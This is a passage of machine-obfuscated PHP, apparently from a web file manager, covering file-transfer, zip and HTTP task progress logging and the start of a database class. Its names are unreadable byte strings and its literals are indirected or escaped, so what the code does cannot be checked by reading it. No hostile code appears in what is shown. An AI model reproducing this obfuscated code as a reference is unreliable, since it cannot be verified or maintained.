Hook::unbind($ˆâÎçÎ‹[641], array($this, $ˆâÎçÎ‹[1728])); Hook::unbind($ˆâÎçÎ‹[643], array($this, $ˆâÎçÎ‹[1729])); Hook::unbind($ˆâÎçÎ‹[607], array($this, $ˆâÎçÎ‹[1730])); Hook::unbind($ˆâÎçÎ‹[604], array($this, $ˆâÎçÎ‹[1730])); Hook::unbind($ˆâÎçÎ‹[609], array($this, $ˆâÎçÎ‹[1730])); Hook::unbind($ˆâÎçÎ‹[611], array($this, $ˆâÎçÎ‹[1730])); Hook::unbind($ˆâÎçÎ‹[613], array($this, $ˆâÎçÎ‹[1730])); Hook::unbind($ˆâÎçÎ‹[1731], array($this, $ˆâÎçÎ‹[1732])); Hook::unbind($ˆâÎçÎ‹[629], array($this, $ˆâÎçÎ‹[1733])); Hook::unbind($ˆâÎçÎ‹[1734], array($this, $ˆâÎçÎ‹[1735])); Hook::unbind($ˆâÎçÎ‹[1736], array($this, $ˆâÎçÎ‹[1737])); Hook::unbind($ˆâÎçÎ‹[1738], array($this, $ˆâÎçÎ‹[1739])); } public function copyMoveStart($ÚÌ×†‘‰, $¡—Æ‡×ä, $Àİ¡Õ²Û, $ÊåÕËÈ§) { $è¹ ã… =& $_SERVER[ ÇƒŠìÀ]; self::log($è¹ ã…[1749] . $¡—Æ‡×ä . $è¹ ã…[72] . $ÊåÕËÈ§); $‰ÆÜñàÇ = rtrim(TEMP_FILES, $è¹ ã…[8]); if (substr($¡—Æ‡×ä, 0, strlen($‰ÆÜñàÇ)) == $‰ÆÜñàÇ) { return; } if (substr($ÊåÕËÈ§, 0, strlen($‰ÆÜñàÇ)) == $‰ÆÜñàÇ) { return; } $ˆöß„ =& $this->task; $ˆöß„[$è¹ ã…[1750]] = KodIO::transferType($ÚÌ×†‘‰, $Àİ¡Õ²Û); $this->update(); } public function updateAfter() { $É¿ë”¥ =& $_SERVER[ ÇƒŠìÀ]; $î•ûœƒ­ =& $this->task; if (!$î•ûœƒ­[$É¿ë”¥[792]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($î•ûœƒ­[$É¿ë”¥[1750]] == $É¿ë”¥[1350]) { return; } self::updateTask($î•ûœƒ­); } private static function updateTask(&$Á¡–çÅ£) { $…™–ç¶ =& $_SERVER[ ÇƒŠìÀ]; if ($Á¡–çÅ£[$…™–ç¶[1750]] == $…™–ç¶[1229] || $Á¡–çÅ£[$…™–ç¶[1750]] == $…™–ç¶[109]) { if ($Á¡–çÅ£[$…™–ç¶[1744]]) { $Á¡–çÅ£[$…™–ç¶[1747]] = $Á¡–çÅ£[$…™–ç¶[1746]] + $Á¡–çÅ£[$…™–ç¶[1743]]; } } else { if ($Á¡–çÅ£[$…™–ç¶[1750]] == $…™–ç¶[1351]) { if ($Á¡–çÅ£[$…™–ç¶[1744]] == $…™–ç¶[1229]) { $Á¡–çÅ£[$…™–ç¶[1747]] = $Á¡–çÅ£[$…™–ç¶[1746]] + $Á¡–çÅ£[$…™–ç¶[1743]] * 0.5; } else { if ($Á¡–çÅ£[$…™–ç¶[1744]] == $…™–ç¶[109]) { $Á¡–çÅ£[$…™–ç¶[1747]] = $Á¡–çÅ£[$…™–ç¶[1746]] + $Á¡–çÅ£[$…™–ç¶[1742]] * 0.5 + $Á¡–çÅ£[$…™–ç¶[1743]] * 0.5; } } } } $Á¡–çÅ£[$…™–ç¶[1691]] = $Á¡–çÅ£[$…™–ç¶[1747]] / $Á¡–çÅ£[$…™–ç¶[792]]; if ($Á¡–çÅ£[$…™–ç¶[1691]] > 0) { $Õ”Ô•¨¸ = timeFloat() - $Á¡–çÅ£[$…™–ç¶[1693]] - $Á¡–çÅ£[$…™–ç¶[1696]]; $Á¡–çÅ£[$…™–ç¶[1697]] = $Õ”Ô•¨¸ * (1 - $Á¡–çÅ£[$…™–ç¶[1691]]) / $Á¡–çÅ£[$…™–ç¶[1691]]; } } public function addPath($éåÜìú) { $–×–©ô¨ =& $_SERVER[ ÇƒŠìÀ]; if (!$éåÜìú) { return; } $éÕ“ŒÔ” =& $this->task; $ëËÀ†çé = IO::infoWithChildren($éåÜìú); $İ¤òé»ü = $éÕ“ŒÔ”[$–×–©ô¨[1751]] ? $éÕ“ŒÔ”[$–×–©ô¨[1751]][$–×–©ô¨[1752]] : 0; $éÕ“ŒÔ”[$–×–©ô¨[1751]] = array($–×–©ô¨[1752] => $İ¤òé»ü + 1, $–×–©ô¨[464] => $ëËÀ†çé[$–×–©ô¨[32]], $–×–©ô¨[86] => $ëËÀ†çé[$–×–©ô¨[86]], $–×–©ô¨[553] => $ëËÀ†çé[$–×–©ô¨[553]] ? $ëËÀ†çé[$–×–©ô¨[553]] : $ëËÀ†çé[$–×–©ô¨[86]]); if ($ëËÀ†çé[$–×–©ô¨[33]] == $–×–©ô¨[216]) { $éÕ“ŒÔ”[$–×–©ô¨[815]] += 1; } else { $éÕ“ŒÔ”[$–×–©ô¨[815]] += $ëËÀ†çé[$–×–©ô¨[81]][$–×–©ô¨[79]]; if ($ëËÀ†çé[$–×–©ô¨[183]]) { $éÕ“ŒÔ”[$–×–©ô¨[815]] += $ëËÀ†çé[$–×–©ô¨[81]][$–×–©ô¨[80]] + 1; } } $éÕ“ŒÔ”[$–×–©ô¨[792]] += $ëËÀ†çé[$–×–©ô¨[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($À„Òúš´) { } public function sourceAddHashEnd($Ë¹ˆ€Õ) { } public function sourceAddFileStart($€İ¿½îŠ) { $‚æû‚áú =& $_SERVER[ ÇƒŠìÀ]; $¦¦ûŸ‰» =& $this->task; $¦¦ûŸ‰»[$‚æû‚áú[1742]] = $€İ¿½îŠ[$‚æû‚áú[78]]; $¦¦ûŸ‰»[$‚æû‚áú[1740]] = $€İ¿½îŠ[$‚æû‚áú[32]]; $¦¦ûŸ‰»[$‚æû‚áú[1099]] = $€İ¿½îŠ[$‚æû‚áú[32]]; $¦¦ûŸ‰»[$‚æû‚áú[1753]] = $€İ¿½îŠ[$‚æû‚áú[86]]; $this->update(); } public function sourceAddFileEnd($ÙÏ©¹Ô¨) { $’Ú Ô¸€ =& $_SERVER[ ÇƒŠìÀ]; $íş¨ºÕÍ =& $this->task; $íş¨ºÕÍ[$’Ú Ô¸€[1747]] += $ÙÏ©¹Ô¨[$’Ú Ô¸€[78]]; $íş¨ºÕÍ[$’Ú Ô¸€[1753]] = $ÙÏ©¹Ô¨[$’Ú Ô¸€[86]]; $this->update(1); } public function copyFileStart($à¾ƒõã¾, $äòåÉè¯, $…‰ÒÙ–ß, $·àîú§ë, $—Ü÷ã¼ğ, $ÇÁ„ƒ‡¨) { $¯õâÑÇ =& $_SERVER[ ÇƒŠìÀ]; $ŞâÃœşá = $—Ü÷ã¼ğ; if ($ŞâÃœşá == $GLOBALS[$¯õâÑÇ[1754]]) { $ŞâÃœşá = $GLOBALS[$¯õâÑÇ[1755]]; } $GLOBALS[$¯õâÑÇ[1755]] = $—Ü÷ã¼ğ; $GLOBALS[$¯õâÑÇ[1754]] = $ÇÁ„ƒ‡¨; $»†üÇá =& $this->task; $»†üÇá[$¯õâÑÇ[1740]] = $ŞâÃœşá; $»†üÇá[$¯õâÑÇ[1742]] = (int) $à¾ƒõã¾->size($äòåÉè¯); $»†üÇá[$¯õâÑÇ[1743]] = 0; $»†üÇá[$¯õâÑÇ[1099]] = $¯õâÑÇ[12]; $»†üÇá[$¯õâÑÇ[1744]] = $¯õâÑÇ[12]; $»†üÇá[$¯õâÑÇ[1745]] = 0; $Ãï‹àƒ = $»†üÇá[$¯õâÑÇ[1742]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($»†üÇá[$¯õâÑÇ[445]] . $¯õâÑÇ[1756]); if ($Ãï‹àƒ && file_exists(get_path_father($·àîú§ë))) { Cache::set($»†üÇá[$¯õâÑÇ[445]] . $¯õâÑÇ[1756], $·àîú§ë); $»†üÇá[$¯õâÑÇ[1713]] = array($¯õâÑÇ[1757], $¯õâÑÇ[1758]); } $this->update(0, $Ãï‹àƒ); } public static function updateCopyLocalFileSize($ùáüÓ) { $ÎßÚè´ =& $_SERVER[ ÇƒŠìÀ]; $ƒéÌ¿Ğ = Cache::get($ùáüÓ[$ÎßÚè´[445]] . $ÎßÚè´[1756]); if (!$ƒéÌ¿Ğ || !file_exists($ƒéÌ¿Ğ)) { return $ùáüÓ; } $ùáüÓ[$ÎßÚè´[1743]] = @filesize($ƒéÌ¿Ğ); $ùáüÓ[$ÎßÚè´[1747]] += $ùáüÓ[$ÎßÚè´[1743]]; self::updateTask($ùáüÓ); return $ùáüÓ; } public function copyFileEnd($üéî³¨Ë, $çêàıåã, $âŞ¸ŠÄ, $“ÌÚÇ·Û, $áÁ’ê…õ, $ä‰®ß¬) { $„„ÅÙõá =& $_SERVER[ ÇƒŠìÀ]; $©¾æÛÏ =& $this->task; $©¾æÛÏ[$„„ÅÙõá[1743]] = $©¾æÛÏ[$„„ÅÙõá[1742]]; $©¾æÛÏ[$„„ÅÙõá[1744]] = $„„ÅÙõá[12]; unset($©¾æÛÏ[$„„ÅÙõá[1713]]); if ($áÁ’ê…õ == $©¾æÛÏ[$„„ÅÙõá[1740]]) { $©¾æÛÏ[$„„ÅÙõá[1746]] += $©¾æÛÏ[$„„ÅÙõá[1742]]; $©¾æÛÏ[$„„ÅÙõá[1747]] = $©¾æÛÏ[$„„ÅÙõá[1746]]; $•œæß¡‘ = 1; if (isset($©¾æÛÏ[$„„ÅÙõá[1753]]) && $©¾æÛÏ[$„„ÅÙõá[1753]] == $çêàıåã) { $•œæß¡‘ = 0; } $this->update($•œæß¡‘); } else { $this->update(); $©¾æÛÏ[$„„ÅÙõá[1743]] = 0; } Cache::remove($©¾æÛÏ[$„„ÅÙõá[445]] . $„„ÅÙõá[1756]); self::log($„„ÅÙõá[1759] . $çêàıåã . $„„ÅÙõá[72] . $“ÌÚÇ·Û . $„„ÅÙõá[248] . $áÁ’ê…õ . $„„ÅÙõá[1760] . $©¾æÛÏ[$„„ÅÙõá[1740]]); } public function updateFileEnd($†¨¬ˆ‹Ÿ, $½’Şµ) { $¹–ƒ²ÏÄ =& $_SERVER[ ÇƒŠìÀ]; $í©ìäö» =& $this->task; $í©ìäö»[$¹–ƒ²ÏÄ[1740]] = $†¨¬ˆ‹Ÿ; $í©ìäö»[$¹–ƒ²ÏÄ[1742]] = $½’Şµ; $í©ìäö»[$¹–ƒ²ÏÄ[1746]] += $½’Şµ; $í©ìäö»[$¹–ƒ²ÏÄ[1747]] = $í©ìäö»[$¹–ƒ²ÏÄ[1746]]; $this->update(1); self::log($¹–ƒ²ÏÄ[1761] . $†¨¬ˆ‹Ÿ); } public function sourceModelCopy($­öôşÀ¶) { $¯•¹ÀÇ» =& $_SERVER[ ÇƒŠìÀ]; $ÇÃæ±® = $­öôşÀ¶[0]; $Ğ…„ÈëÎ = $­öôşÀ¶[1]; $‚»Û¥¨ï =& $this->task; $this->sourceModelCopyFlag = !0; $¾ğâ‘Öš = 0; switch ($ÇÃæ±®) { case $¯•¹ÀÇ»[605]: $¾ğâ‘Öš = 1; break; case $¯•¹ÀÇ»[608]: $‚»Û¥¨ï[$¯•¹ÀÇ»[1740]] = $Ğ…„ÈëÎ[$¯•¹ÀÇ»[32]]; break; case $¯•¹ÀÇ»[610]: $¾ğâ‘Öš = intval($­öôşÀ¶[$¯•¹ÀÇ»[426]] * 0.4); break; case $¯•¹ÀÇ»[612]: $¾ğâ‘Öš = intval($­öôşÀ¶[$¯•¹ÀÇ»[426]] * 0.2); break; case $¯•¹ÀÇ»[614]: $¾ğâ‘Öš = intval($­öôşÀ¶[$¯•¹ÀÇ»[426]] * 0.4); break; } $this->update($¾ğâ‘Öš); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¯Ì¥¥ì, $µßŠ¸œ‡) { $²¹ƒª… =& $_SERVER[ ÇƒŠìÀ]; $this->sourceModelCopyFlag = !0; $Ã‘ş¯š = 1; if (isset($¯Ì¥¥ì[$²¹ƒª…[81]])) { $Ã‘ş¯š = $¯Ì¥¥ì[$²¹ƒª…[81]][$²¹ƒª…[79]]; $Ã‘ş¯š = $Ã‘ş¯š + $¯Ì¥¥ì[$²¹ƒª…[81]][$²¹ƒª…[80]] + 1; } $this->update($Ã‘ş¯š); $this->sourceModelCopyFlag = !1; } public function sourceMove($µ…şÔ‚®) { $this->sourceRemove($µ…şÔ‚®, !1); } public function curlProgress($æ…ÜÄƒ“, $™–›âöé, $Éîµ¡”ú, $À¦ïêÌÓ, $ÁÛŸºø‡) { $Ûã›Æ–— =& $_SERVER[ ÇƒŠìÀ]; $Ã§Ğ¯© =& $this->task; if ($ÁÛŸºø‡ > 0) { $Ã§Ğ¯©[$Ûã›Æ–—[1099]] = $Ûã›Æ–—[1762]; $Ã§Ğ¯©[$Ûã›Æ–—[1744]] = $Ûã›Æ–—[109]; if ($Ã§Ğ¯©[$Ûã›Æ–—[1742]]) { $Ã§Ğ¯©[$Ûã›Æ–—[1743]] = $ÁÛŸºø‡; } if ($Ã§Ğ¯©[$Ûã›Æ–—[1745]]) { $Ã§Ğ¯©[$Ûã›Æ–—[1743]] = $ÁÛŸºø‡ + $Ã§Ğ¯©[$Ûã›Æ–—[1745]]; } } else { if ($Éîµ¡”ú > 0) { if ($Ã§Ğ¯©[$Ûã›Æ–—[1742]] == $™–›âöé) { $Ã§Ğ¯©[$Ûã›Æ–—[1743]] = $Éîµ¡”ú; $Ã§Ğ¯©[$Ûã›Æ–—[1099]] = $Ûã›Æ–—[1763]; $Ã§Ğ¯©[$Ûã›Æ–—[1744]] = $Ûã›Æ–—[1229]; } } } $this->update(); } public function curlProgressStart($¦‚èËëº) { } public function curlProgressEnd($ÀÒ­½Üı) { $³ãšœÇÇ =& $_SERVER[ ÇƒŠìÀ]; $©ƒæÓº =& $this->task; $…¬³¶ö = curl_getinfo($ÀÒ­½Üı); $à“—‚¹× = $…¬³¶ö[$³ãšœÇÇ[1764]]; if ($à“—‚¹× == -1) { $à“—‚¹× = $…¬³¶ö[$³ãšœÇÇ[1765]]; } if ($©ƒæÓº[$³ãšœÇÇ[1744]] == $³ãšœÇÇ[109] && $à“—‚¹×) { $©ƒæÓº[$³ãšœÇÇ[1745]] += $à“—‚¹×; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $éäƒÚó =& $_SERVER[ ÇƒŠìÀ]; $º½Ûî =& $this->task; $º½Ûî[$éäƒÚó[1766]] = 1; Hook::bind($éäƒÚó[1734], array($this, $éäƒÚó[1767])); Hook::bind($éäƒÚó[1736], array($this, $éäƒÚó[1768])); Hook::bind($éäƒÚó[1738], array($this, $éäƒÚó[1769])); } protected function endAfter() { $¸Ä…æóò =& $_SERVER[ ÇƒŠìÀ]; Hook::unbind($¸Ä…æóò[1734], array($this, $¸Ä…æóò[1767])); Hook::unbind($¸Ä…æóò[1736], array($this, $¸Ä…æóò[1768])); Hook::unbind($¸Ä…æóò[1738], array($this, $¸Ä…æóò[1769])); } public function progressStart($ü‰ˆ´Ÿ€) { $«öØãÊ± =& $_SERVER[ ÇƒŠìÀ]; $¬ñ†Š„‘ = curl_getinfo($ü‰ˆ´Ÿ€); self::log($«öØãÊ±[1770] . $¬ñ†Š„‘[$«öØãÊ±[353]]); self::valueSet($this->task[$«öØãÊ±[445]], $this->task); } public function progressEnd($â…’¤å¦) { $¯å˜ü =& $_SERVER[ ÇƒŠìÀ]; self::log($¯å˜ü[1771] . $this->task[$¯å˜ü[445]]); $this->end(); } public function progress($ä¬£Ïİî, $÷ë¼Œê“, $ó¯¬ü™, $ˆ‡Æ»«ó, $ß¯ ÒÚ¤) { $ÄóæµæÖ =& $_SERVER[ ÇƒŠìÀ]; $ÛÙõüõº =& $this->task; if ($ß¯ ÒÚ¤ > 0) { $ÛÙõüõº[$ÄóæµæÖ[815]] = $ÛÙõüõº[$ÄóæµæÖ[815]] == 0 ? $ˆ‡Æ»«ó : $ÛÙõüõº[$ÄóæµæÖ[815]]; $ÛÙõüõº[$ÄóæµæÖ[1690]] = $ß¯ ÒÚ¤; } else { if ($ó¯¬ü™ > 0) { $ÛÙõüõº[$ÄóæµæÖ[815]] = $ÛÙõüõº[$ÄóæµæÖ[815]] == 0 ? $÷ë¼Œê“ : $ÛÙõüõº[$ÄóæµæÖ[815]]; $ÛÙõüõº[$ÄóæµæÖ[1690]] = $ó¯¬ü™; } } $this->update(); self::log("\160\x72\x6f\147\162\145\x73\163\110\x74\x74\160\x3a\x64\157\167\x6e\x3a{$ó¯¬ü™}\57{$÷ë¼Œê“}\x3b\40\x75\160\x6c\x6f\141\144\72{$ß¯ ÒÚ¤}\x2f{$ˆ‡Æ»«ó}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÜıäÕ¸©, $Îó¢†± = '', $ç¾·ñÎµ = 0, $âí½šê = '') { $Æ›÷¼ú =& $_SERVER[ ÇƒŠìÀ]; $âí½šê = $âí½šê ? $âí½šê : ($Îó¢†± ? $Îó¢†± : $ÜıäÕ¸©); $°ôÌÚŸÊ = new Task($ÜıäÕ¸©, $Îó¢†±, $ç¾·ñÎµ, $âí½šê); $GLOBALS[$Æ›÷¼ú[1772] . $ÜıäÕ¸©] = new TaskLog($Æ›÷¼ú[1673], $°ôÌÚŸÊ, $âí½šê); return $°ôÌÚŸÊ; } public function __construct($¼¾ı›©ş = '', $Ï‘ıóœ = '', $­´¦¤ÒŒ = '') { $‚ş©®¼ä =& $_SERVER[ ÇƒŠìÀ]; if (!$¼¾ı›©ş) { $¼¾ı›©ş = $‚ş©®¼ä[1673]; } $® º²¯Ó = $¼¾ı›©ş . $‚ş©®¼ä[432] . rand_string(10); if (!$­´¦¤ÒŒ) { $­´¦¤ÒŒ = $¼¾ı›©ş . $‚ş©®¼ä[53] . $­´¦¤ÒŒ; } switch ($¼¾ı›©ş) { case $‚ş©®¼ä[1673]: if (!$Ï‘ıóœ || !$Ï‘ıóœ->task) { return echoLog($¼¾ı›©ş . $‚ş©®¼ä[1773]); } $ÂÊ÷ëÃ› = $Ï‘ıóœ; $® º²¯Ó = $ÂÊ÷ëÃ›->task[$‚ş©®¼ä[445]]; $¼¾ı›©ş = $ÂÊ÷ëÃ›->task[$‚ş©®¼ä[445]]; if (!$ÂÊ÷ëÃ›->task[$‚ş©®¼ä[1579]]) { $ÂÊ÷ëÃ›->task[$‚ş©®¼ä[1579]] = $­´¦¤ÒŒ ? $­´¦¤ÒŒ : $¼¾ı›©ş; } break; case $‚ş©®¼ä[1774]: if (!$Ï‘ıóœ) { return echoLog($¼¾ı›©ş . $‚ş©®¼ä[1775]); } $Ê×¦§÷ø = is_string($Ï‘ıóœ) ? array($Ï‘ıóœ) : $Ï‘ıóœ; $ÂÊ÷ëÃ› = new TaskFileTransfer($® º²¯Ó, $¼¾ı›©ş, 0, $­´¦¤ÒŒ ? $­´¦¤ÒŒ : $Ê×¦§÷ø[0]); foreach ($Ê×¦§÷ø as $óİª¢ ´) { $ÂÊ÷ëÃ›->addPath($óİª¢ ´); } break; case $‚ş©®¼ä[359]: if (!$Ï‘ıóœ) { return echoLog($¼¾ı›©ş . $‚ş©®¼ä[1775]); } $Ê×¦§÷ø = is_string($Ï‘ıóœ) ? array($Ï‘ıóœ) : $Ï‘ıóœ; $ÂÊ÷ëÃ› = new TaskZip($® º²¯Ó, $¼¾ı›©ş, 0, $­´¦¤ÒŒ ? $­´¦¤ÒŒ : $Ê×¦§÷ø[0]); foreach ($Ê×¦§÷ø as $óİª¢ ´) { $ÂÊ÷ëÃ›->addPath($óİª¢ ´); } break; case $‚ş©®¼ä[1249]: if (!$Ï‘ıóœ) { return echoLog($¼¾ı›©ş . $‚ş©®¼ä[1775]); } $ÂÊ÷ëÃ› = new TaskUnZip($® º²¯Ó, $¼¾ı›©ş, 0, $­´¦¤ÒŒ ? $­´¦¤ÒŒ : $Ï‘ıóœ); if ($Ï‘ıóœ) { $ÂÊ÷ëÃ›->addFile($Ï‘ıóœ); } break; case $‚ş©®¼ä[151]: $ÂÊ÷ëÃ› = new TaskHttp($® º²¯Ó, $¼¾ı›©ş); break; default: return; break; } $this->task = $ÂÊ÷ëÃ›; $this->taskID = $® º²¯Ó; Hook::bind($‚ş©®¼ä[1710], array($this, $‚ş©®¼ä[1776])); Hook::bind($‚ş©®¼ä[1712], array($this, $‚ş©®¼ä[1777])); Hook::bind($‚ş©®¼ä[1706], array($this, $‚ş©®¼ä[1778])); echoLog($‚ş©®¼ä[1779] . $ÂÊ÷ëÃ›->task[$‚ş©®¼ä[1579]]); } public function __destruct() { $this->end(); } public function end($Òûª¹ ¤ = '') { $ìÉ©ïÔÂ =& $_SERVER[ ÇƒŠìÀ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Òûª¹ ¤); $this->task = !1; $this->taskID = !1; Hook::unbind($ìÉ©ïÔÂ[1710], array($this, $ìÉ©ïÔÂ[1776])); Hook::unbind($ìÉ©ïÔÂ[1712], array($this, $ìÉ©ïÔÂ[1777])); Hook::unbind($ìÉ©ïÔÂ[1706], array($this, $ìÉ©ïÔÂ[1778])); } public function taskUpdate($²²·˜•ù) { $ÛµƒôÕ =& $_SERVER[ ÇƒŠìÀ]; if (!$²²·˜•ù || $this->taskID != $²²·˜•ù[$ÛµƒôÕ[445]]) { return; } $¨Ó°Â‡Œ = 20; $ö¹¹‰Šğ = intval($²²·˜•ù[$ÛµƒôÕ[1691]] * $¨Ó°Â‡Œ); $äÈÉ„½œ = $ÛµƒôÕ[165] . str_repeat($ÛµƒôÕ[917], $ö¹¹‰Šğ) . $ÛµƒôÕ[1049] . str_repeat($ÛµƒôÕ[53], $¨Ó°Â‡Œ - $ö¹¹‰Šğ) . $ÛµƒôÕ[167]; $· ®«£ˆ = $äÈÉ„½œ . sprintf($ÛµƒôÕ[1780], $²²·˜•ù[$ÛµƒôÕ[1691]] * 100) . $ÛµƒôÕ[1781]; $ËÍäšıˆ = $· ®«£ˆ . $²²·˜•ù[$ÛµƒôÕ[1690]] . $ÛµƒôÕ[8] . $²²·˜•ù[$ÛµƒôÕ[815]] . LNG($ÛµƒôÕ[1782]); $è·Ëªâ¡ = $ÛµƒôÕ[12]; if ($²²·˜•ù[$ÛµƒôÕ[1766]]) { $ËÍäšıˆ = $· ®«£ˆ . size_format($²²·˜•ù[$ÛµƒôÕ[1690]]) . $ÛµƒôÕ[8] . size_format($²²·˜•ù[$ÛµƒôÕ[815]]); $è·Ëªâ¡ = size_format($²²·˜•ù[$ÛµƒôÕ[1692]]) . $ÛµƒôÕ[1783]; } if ($²²·˜•ù[$ÛµƒôÕ[1099]]) { $²²·˜•ù[$ÛµƒôÕ[1740]] = $²²·˜•ù[$ÛµƒôÕ[1099]] . $ÛµƒôÕ[53] . $²²·˜•ù[$ÛµƒôÕ[1740]]; } if ($²²·˜•ù[$ÛµƒôÕ[1740]]) { $ö›ÓÎ“Ù = $ÛµƒôÕ[12]; if ($²²·˜•ù[$ÛµƒôÕ[1742]]) { $ö›ÓÎ“Ù = $ÛµƒôÕ[50] . size_format($²²·˜•ù[$ÛµƒôÕ[1743]]) . $ÛµƒôÕ[8] . size_format($²²·˜•ù[$ÛµƒôÕ[1742]]); } $è·Ëªâ¡ .= $²²·˜•ù[$ÛµƒôÕ[1740]] . $ö›ÓÎ“Ù; } if ($²²·˜•ù[$ÛµƒôÕ[792]] && !$²²·˜•ù[$ÛµƒôÕ[1742]]) { $è·Ëªâ¡ .= $ÛµƒôÕ[53] . size_format($²²·˜•ù[$ÛµƒôÕ[1747]]) . $ÛµƒôÕ[8] . size_format($²²·˜•ù[$ÛµƒôÕ[792]]); } echoLog($ËÍäšıˆ . $ÛµƒôÕ[53] . $è·Ëªâ¡, !0); } public function taskEnd($ªîÓşÜÌ) { $›ÁÌ´«“ =& $_SERVER[ ÇƒŠìÀ]; if (!$ªîÓşÜÌ || $this->taskID != $ªîÓşÜÌ[$›ÁÌ´«“[445]]) { return; } $²”Ø¸¡¥ = $ªîÓşÜÌ ? $ªîÓşÜÌ[$›ÁÌ´«“[1690]] . $›ÁÌ´«“[8] . $ªîÓşÜÌ[$›ÁÌ´«“[815]] . LNG($›ÁÌ´«“[1782]) . $›ÁÌ´«“[73] : $›ÁÌ´«“[12]; echoLog($›ÁÌ´«“[1784] . $ªîÓşÜÌ[$›ÁÌ´«“[1579]] . ($ªîÓşÜÌ[$›ÁÌ´«“[496]] ? $›ÁÌ´«“[73] . $ªîÓşÜÌ[$›ÁÌ´«“[496]] : $›ÁÌ´«“[12]) . $›ÁÌ´«“[73] . $²”Ø¸¡¥ . $›ÁÌ´«“[1785] . sprintf($›ÁÌ´«“[880], timeFloat() - $ªîÓşÜÌ[$›ÁÌ´«“[1693]]) . $›ÁÌ´«“[1705]); $this->end(); } public function taskKill($îŠ¿œ™ø) { $Åßˆƒ¦ã =& $_SERVER[ ÇƒŠìÀ]; if (!$îŠ¿œ™ø || $this->taskID != $îŠ¿œ™ø[$Åßˆƒ¦ã[445]]) { return; } echoLog($Åßˆƒ¦ã[1786] . $îŠ¿œ™ø[$Åßˆƒ¦ã[1579]]); } } goto CÁÖÙª£ÊŠ; C­¯ËÛŒÏÜ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\145\x71" => "\74\76", "\147\x74" => "\76", "\145\x67\164" => "\x3e\75", "\154\164" => "\x3c", "\x65\154\164" => "\x3c\x3d", "\156\157\x74\154\151\x6b\x65" => "\x4e\117\x54\x20\x4c\x49\x4b\x45", "\x6c\x69\153\145" => "\x4c\111\113\105", "\x69\x6e" => "\x49\116", "\x6e\157\x74\x69\156" => "\116\x4f\x54\40\111\116", "\156\157\164\40\151\156" => "\x4e\117\x54\40\x49\116", "\x62\145\x74\167\145\145\x6e" => "\x42\105\124\127\105\105\x4e", "\x6e\x6f\x74\142\x65\164\167\145\x65\x6e" => "\116\x4f\x54\40\102\x45\x54\127\105\x45\116", "\x6e\x6f\164\x20\142\x65\164\167\145\145\156" => "\116\117\x54\40\102\105\124\x57\x45\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\x54\45\104\x49\123\x54\x49\x4e\103\x54\x25\40\x25\106\x49\x45\x4c\104\x25\40\x46\x52\x4f\115\x20\x25\x54\x41\x42\114\x45\45\x25\112\x4f\x49\x4e\x25\x25\x57\x48\105\122\105\45\x25\107\x52\x4f\125\x50\x25\45\x48\x41\126\111\x4e\107\45\45\x4f\122\x44\x45\x52\45\x25\114\111\115\111\x54\45\40\x25\x55\x4e\x49\117\x4e\45\x25\103\117\115\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $·²ªÃí = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ ÇƒŠìÀ][995], $·²ªÃí); } public function factory($°İ¥¸ö = '') { $Ü”½ÅÎ =& $_SERVER[ ÇƒŠìÀ]; $°İ¥¸ö = $this->parseConfig($°İ¥¸ö); if (empty($°İ¥¸ö[$Ü”½ÅÎ[996]])) { think_exception(think_lang($Ü”½ÅÎ[997])); } $this->dbType = ucwords(strtolower($°İ¥¸ö[$Ü”½ÅÎ[996]])); $ÍÒÄºŠ¬ = $Ü”½ÅÎ[998] . $this->dbType; if (class_exists($ÍÒÄºŠ¬)) { $õ˜Ü×ş‰ = new $ÍÒÄºŠ¬($°İ¥¸ö); if ($Ü”½ÅÎ[999] != strtolower($°İ¥¸ö[$Ü”½ÅÎ[996]])) { $õ˜Ü×ş‰->dbType = strtoupper($this->dbType); } else { $õ˜Ü×ş‰->dbType = $this->_getDsnType($°İ¥¸ö[$Ü”½ÅÎ[951]]); } } else { think_exception(think_lang($Ü”½ÅÎ[1000]) . $Ü”½ÅÎ[1001] . $ÍÒÄºŠ¬); } return $õ˜Ü×ş‰; } public function __call($Àø¡š, $ôŒáˆªÉ) { if (method_exists($this, $Àø¡š)) { return call_user_func_array(array($this, $Àø¡š), $ôŒáˆªÉ); } } protected function _getDsnType($€ö¸ÄÍ—) { $¿×Ëæ£ = explode($_SERVER[ ÇƒŠìÀ][4], $€ö¸ÄÍ—); $‚îò¼ß‡ = strtoupper(trim($¿×Ëæ£[0])); return $‚îò¼ß‡; } private function parseConfig($‚ÌÃ¦ = '') { $´°ÈÍ¶¢ =& $_SERVER[ ÇƒŠìÀ]; if (!empty($‚ÌÃ¦) && is_string($‚ÌÃ¦)) { $‚ÌÃ¦ = $this->parseDSN($‚ÌÃ¦); } elseif (is_array($‚ÌÃ¦)) { $‚ÌÃ¦ = array_change_key_case($‚ÌÃ¦); $‚ÌÃ¦ = array($´°ÈÍ¶¢[996] => $‚ÌÃ¦[$´°ÈÍ¶¢[1002]], $´°ÈÍ¶¢[921] => $‚ÌÃ¦[$´°ÈÍ¶¢[1003]], $´°ÈÍ¶¢[922] => $‚ÌÃ¦[$´°ÈÍ¶¢[1004]], $´°ÈÍ¶¢[919] => $‚ÌÃ¦[$´°ÈÍ¶¢[1005]], $´°ÈÍ¶¢[920] => $‚ÌÃ¦[$´°ÈÍ¶¢[1006]], $´°ÈÍ¶¢[21] => $‚ÌÃ¦[$´°ÈÍ¶¢[1007]], $´°ÈÍ¶¢[951] => $‚ÌÃ¦[$´°ÈÍ¶¢[1008]], $´°ÈÍ¶¢[17] 